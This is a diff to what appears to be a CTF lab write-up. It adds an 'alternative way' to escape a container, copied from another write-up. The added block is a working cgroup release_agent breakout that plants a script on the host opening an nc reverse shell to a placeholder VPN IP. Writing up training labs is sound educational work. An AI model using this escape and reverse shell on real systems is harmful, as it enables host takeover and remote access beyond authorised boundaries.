@@ -774,6 +774,19 @@ Flag:THM{digging_down_then_digging_up}
 root@cave:/mnt/host/root#
 ```
 
+## Alternative way for escaping container (Pulled from another write-up):
+
+```shell
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [YOUR_VPN_IP] 5555 >/tmp/f" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
 ---
 
 > Well, it was easily one of the hardest CTFs I've ever done. I had to get some hints and help while doing this, to be honest, but it was worth it. It was my first `Insane` level lab, and I actually did learn new things. Besides all these, I am in love with the concept of this room. It reminded me of that one Black Mirror interactive movie "Bandersnatch" and "Choose or Die" Movie. I recommend you watch both! GOATED!!
